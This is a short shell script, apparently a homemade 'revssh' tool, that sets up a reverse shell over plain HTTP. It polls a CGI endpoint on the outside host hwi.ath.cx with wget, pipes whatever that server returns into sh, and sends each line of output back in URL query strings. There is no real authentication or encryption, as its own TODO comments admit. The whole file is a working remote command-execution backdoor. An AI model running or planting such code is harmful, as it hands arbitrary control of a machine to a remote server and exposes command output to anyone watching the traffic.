#!/bin/sh
## TODO: -safe should exec su - which will require password before commands can be execed
##       (not really safe since no encryption ... https?)
## TODO: Output should be clumped together, not one request per line
##       Could we use HTML upload instead of post/get?
## TODO: because the shell isn't interactive, we may want to source /etc/profile and other stuff so the user doesn't have to
PROTOCOL="http"
# PROTOCOL="https"
SERVER="hwi.ath.cx"
CGIPATH="/cgi-bin/joey/revssh"
URL="$PROTOCOL://$SERVER/$CGIPATH"
HOSTNAME=`hostname`

COM="wget -nv -O -"
# COM="lynx -source"
# COM="telnetget ..."

if [ "$1" = -check ]
then
	RESPONSE=`$COM "$URL?checkhost=$HOSTNAME" || echo "$0: Failed to hit $URL" >&2`
	if [ ! "$RESPONSE" = "yes please init" ]
	then
		echo "$0: server $SERVER declined session initialisation"
		exit 0
	fi
fi

SESSID=$HOSTNAME"_$$"

$COM "$URL?sessid=$SESSID&init=true" |

sh 2>&1 |

while read LINE
do $COM "$URL?sessid=$SESSID&output=$LINE"
done
